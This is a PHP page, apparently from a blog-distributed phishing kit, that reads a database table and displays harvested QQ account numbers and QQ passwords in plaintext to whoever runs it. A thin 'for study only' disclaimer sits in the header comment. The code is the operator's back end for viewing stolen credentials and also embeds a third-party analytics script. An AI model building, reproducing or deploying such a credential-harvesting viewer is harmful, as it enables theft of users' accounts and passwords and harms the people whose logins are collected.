<!-- 
FancyPig's blog
https://www.iculture.cc
本程序仅供大家学习交流
禁止使用与违法犯罪
感谢大家！
-->
<?php
include('text.php');
$sql = "SELECT * FROM `mag`  ORDER BY id DESC";
$sth = $pdo->prepare($sql);
$sth->execute();

$rows = $sth->fetchAll();

?>

<!DOCTYPE html>
<html lang="zh-cn">

<head>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <title>信息查看</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    </head>

<body>
        <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?cb7a49e4f6a740b15e6fd25de2803712";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
    <?php
    foreach ($rows as $key => $mag) {
    ?>
        <table class="table">

            <thead class="thead-dark">
                <tr>
                    <th scope="col">排序</th>
                    <th scope="col">QQ账号</th>
                    <th scope="col">QQ密码</th>

                </tr>
            </thead>
            <tbody>

                <tr>

                    <th scope="row"><?php echo $mag['id']; ?></th>
                    <td><?php echo $mag['username']; ?></td>
                    <td><?php echo $mag['lynr']; ?></td>

                </tr>

            </tbody>
        </table>

        </table>
    <?php
    }
    ?>
</body>

</html>
